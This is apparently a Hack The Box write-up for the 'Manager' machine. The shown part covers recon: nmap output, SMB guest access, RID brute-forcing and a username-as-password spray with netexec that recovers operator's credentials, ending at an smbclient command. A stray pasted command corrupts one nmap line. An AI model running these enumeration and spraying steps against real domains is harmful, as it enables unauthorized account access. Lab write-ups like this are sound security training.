---
title: HTB - Manager
pin: true
layout: ""
author: Scott
math: true
date: 
mermaid: true
---

![alt text](/manager/manager.png)


## Overview: 
Manager is an Windows Medium Machine which include enumeration a password spray attack and RID cycling to count users in order to access the MSSQL service. After that, the filesystem is examined using the xp_dirtree process, which reveals a website backup in the web-root including an old config file with creds for a user. After that, we  get access to the ADCS instance, then take advantage of the misconfigured ESC7 to gain administrator access.


## Recon
---

### Nmap:

As always start with port scanning of cozyHosting using nmap:
```python
kali Medium/Manager » sudo nmap -sC -sV 10.10.11.236 -vv --min-rate 5000  -oN nmap/initial
Host is up, received echo-reply ttl 127 (1.3s latency).
Scanned at 2024-03-13 16:18:59 +0545 for 482s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
|_
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-03-13 17:39:30Z)
|_
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
|_
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
|_
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-13T17:41:42+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: shig any manager.htb @10.10.11.236 a256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.236:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.236:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-03-13T17:41:42+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-13T16:50:43
| Not valid after:  2054-03-13T16:50:43
| MD5:   553a:a53f:9039:1589:43fd:6ff1:cf48:d0f1
| SHA-1: e6c5:24be:746e:2f54:fb1f:963e:ce9f:0244:a9d0:177f
|_
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-13T17:41:42+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-13T17:41:41+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-03-13T17:41:01
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 4401/tcp): CLEAN (Timeout)
|   Check 2 (port 18973/tcp): CLEAN (Timeout)
|   Check 3 (port 12164/udp): CLEAN (Timeout)
|   Check 4 (port 30748/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```
During nmap scan, the ports has been found i.e 53, 80, 389, 445, 1433, etc .
<hr>

There is domain `manager.htb` and `dc01.manager.htb`. So adding in /etc/hosts.
![alt text](/manager/host.png)

### DNS 53
Dig tools perform a DNS query for the domain `manager.htb` against the DNS server located at the IP address `10.10.11.236`.

```bash
kali Medium/Manager » dig any manager.htb @10.10.11.236 
```
![alt text](/manager/dig.png)
Nothing much found

### HTTP 80
This page looks Content writing services .
![alt text](/manager/port80.png)

There is nothing much found.

### SMB 445
Lets try SMB client to list all shares available on the server. 
![alt text](/manager/smbclient.png)
It shows error `NT_STATUS_RESOURCE_NAME_NOT_FOUND` while accessing to Null Sessions. This indicates that we are unable to use this approach to list network-level shared resources. 
<br>

But we could try use a Guest Session and just entering an arbitrary username to log in:
![alt text](/manager/smblogin.png)
It can give us accessing to guest as login. Next step is to attempt brute force the RID starting from 5000 using netexec.
```bash
kali Medium/Manager » netexec smb 10.10.11.236  -u 'guest' -p '' --rid-brute 5000                                                                                                        130 ↵
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest:
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```
We got list of all users. 
<br>

Copy to the file username.txt and extract only the usernames from the lines in the username.txt file that match the specified pattern and writes them to a new file called user.txt
```python
kali Medium/Manager » cat username.txt | sed -n 's/.*MANAGER\\\(.*\) .*/\1/p' > user.txt
administrator
guest
krbtgt
zhong
cheng
ryan
raven
jinWoo
chinHae
operator
```
Lets Password spraying for username 'operator' 

```bash
kali Medium/Manager » netexec smb 10.10.11.236  -u user.txt -p 'user.txt' --no-bruteforce
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinWoo:jinWoo STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinHae:chinHae STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```
We got credential for user operator. The password is 'operator'. 
<br>

So we used smbclient to login with operator and with its creds.

![alt text](/manager/operator.png)

There is SYSVOL file share


 ```bash
 smbclient \\\\10.129.143.125\\SYSVOL -U operator
 ```

 